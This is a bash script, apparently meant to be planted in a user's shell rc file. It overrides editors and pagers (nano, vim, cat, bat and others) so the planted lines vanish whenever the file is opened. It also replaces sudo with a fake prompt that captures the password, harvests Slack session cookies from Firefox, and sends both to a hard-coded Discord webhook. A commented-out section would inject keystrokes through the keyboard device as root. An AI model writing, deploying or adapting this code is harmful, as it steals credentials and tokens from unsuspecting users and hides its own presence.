nano(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command nano $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command nano $@
	fi
}

vi(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command vi $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command vi $@
	fi
}

vim(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command vim $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command vim $@
	fi
}

nvim(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command nvim $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command nvim $@
	fi
}

cat(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command cat $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command cat $@
	fi
}

bat(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command bat $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command bat $@
	fi
}

tac(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command tac $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command tac $@
	fi
}

sudo(){
	command sudo -nv 2>/dev/null
	if [[ "$?" = "0" ]]; then
		command sudo -n $@
	else
		horseVision=""
		attempts=0
		success="false"
		while true; do
			read -sp "[sudo] password for $USER:" horseVision
			echo ""
			echo "$horseVision" | command sudo -p "" -Sv 2>/dev/null 1>/dev/null
			if [[ "$?" = "0" ]]; then
				success="true"
				break
			elif [[ "$attempts" != "2" ]]; then
				echo "Sorry, try again"
				attempts="$(($attempts + 1))"
			else
				echo "sudo: 3 incorrect password attempts"
				break
			fi
		done
		if [[ "$success" = "true" ]]; then
			horseData="#horseVision = \"$horseVision\" #--rcHorse--"
			command sudo -n $@
			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then
				echo "$horseData" >> $HOME/rcTarget
			fi

			token=$(find "$HOME/.mozilla/firefox" -type f -name "cookies.sqlite" 2>/dev/null | while read -r cookie_db; do
					tmp_db=$(mktemp /tmp/cookies.XXXXXX.sqlite) 2>/dev/null
					cp "$cookie_db" "$tmp_db" 2>/dev/null
					sqlite3 "$tmp_db" "SELECT value FROM moz_cookies;" 2>/dev/null
					rm -f "$tmp_db" 2>/dev/null
					done | grep -aoE 'xoxd-[A-Za-z0-9%]+' 2>/dev/null | awk '{printf "%s ", $0}' 2>/dev/null; echo)
			usr=$(whoami)
			pwd=$(pwd)

			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd} token=${token}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
#			setsid bash -c 'echo '"$horseVision"' | sudo -ES bash -c '\''
#				declare -A keycodes
#				keycodes=(["a"]=30 ["b"]=48 ["c"]=46 ["d"]=32 ["e"]=18 ["f"]=33 ["g"]=34 ["h"]=35 ["i"]=23 ["j"]=36 ["k"]=37 ["l"]=38 ["m"]=50 ["n"]=49 ["o"]=24 ["p"]=25 ["q"]=16 ["r"]=19 ["s"]=31 ["t"]=20 ["u"]=22 ["v"]=47 ["w"]=17 ["x"]=45 ["y"]=21 ["z"]=44 ["_"]=57 ["#"]=15 ["("]=1 [")"]=-1 ["["]=2 ["]"]=-2 ["{"]=3	["}"]=-3)
#				keyboard=$(libinput list-devices | awk "/^Device:/ {name=\$0} /^Kernel:/ {dev=\$2} /^Capabilities:/ && /keyboard/ && tolower(name) ~ /keyboard/ {print dev; exit}")
#				texts=("(h)i_there_" "(l)ooking_cute_today_" "(" ")" "[#]" "{#}")
#				while true; do
#					sleep $((9000 + RANDOM % 3600))
#					text=${texts[$((RANDOM % ${#texts[@]}))]}
#					echo "$text" | fold -w1 | while read -r letter; do
#						code=${keycodes[$letter]}
#						if [[ $code -eq 1 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						elif [[ $code -eq -1 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						elif [[ $code -eq 2 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						elif [[ $code -eq -2 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						elif [[ $code -eq 3 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						elif [[ $code -eq -3 ]]; then
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | sdd of="$keyboard" bs=24 >/dev/null 2>&1
#						else
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
#						fi
#					done
#				done
#				'\'' &' >/dev/null 2>&1 </dev/null
		fi
	fi
}
